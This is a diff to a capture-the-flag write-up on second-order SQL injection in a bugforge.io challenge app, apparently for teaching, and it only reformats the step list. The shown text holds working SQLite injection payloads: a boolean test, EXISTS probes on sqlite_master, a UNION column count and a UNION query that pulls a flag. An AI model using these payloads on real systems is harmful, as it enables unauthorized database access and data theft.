@@ -42,10 +42,10 @@ test' union select 1,2,n-- -    # for n times until you get return true (true = 
 # Example
 This example i am taking from the [bugforge.io](https://app.bugforge.io/) platform FurHire weekly challenge.
 ### Steps of Exploitation:-
-Step 1:- Identify second order sqli in Job tittle.
-step 2:- Test sqli with `' or 1=1-- -`
-Step 3:- Detect database.
-Step 4:- `sqlite` database detected, know let's search table name with `EXISTS`
+- Step 1:- Identify second order sqli in Job tittle.
+- Step 2:- Test sqli with `' or 1=1-- -`
+- Step 3:- Detect database.
+- Step 4:- `sqlite` database detected, know let's search table name with `EXISTS`
 ```bash
 # If the table exists this statment will return TRUE and viceversa
 
@@ -62,8 +62,8 @@ account
 usrloginfo
 ```
 
-Step 5:- config and user table detection know let's fetch flag from columns.
-Step 6:- fetch columns name with contains flag string 
+- Step 5:- config and user table detection know let's fetch flag from columns.
+- Step 6:- fetch columns name with contains flag string 
 
 ```bash
 'or exists(select 1 from sqlite_master where name='config' and sql LIKE '%flag%')--
@@ -74,13 +74,13 @@ Step 6:- fetch columns name with contains flag string
 - **TRUE** → The `config` table exists AND has a column with "flag" in the name (like `flag`, `flags`, `secret_flag`, `api_flag`, etc.)
 - **FALSE** → Either the table doesn't exist OR it has no column with "flag" in the name
 
-Step 7:- know let's check how any columns are there  payload= test' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- -
-Step 8:- fetching flag
+- Step 7:- know let's check how any columns are there  payload= test' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- -
+- Step 8:- fetching flag
 
 ```bash
 ' UNION SELECT * FROM (SELECT value FROM config WHERE key='flag') JOIN (SELECT 2) JOIN (SELECT 3) JOIN (SELECT 4) JOIN (SELECT 5) JOIN (SELECT 6) JOIN (SELECT 7) JOIN (SELECT 8) JOIN (SELECT 9) JOIN (SELECT 10) JOIN (SELECT 11) JOIN (SELECT 12) JOIN (SELECT 13) JOIN (SELECT 14) JOIN (SELECT 15)--
 ```
-Step 9:- Wrote a small python script for automation. This will create a job, grab the created job_id and send a reuquest to fetech flag from the id parameter with that job_id.
+- Step 9:- Wrote a small python script for automation. This will create a job, grab the created job_id and send a reuquest to fetech flag from the id parameter with that job_id.
 ```bash
 import requests
 
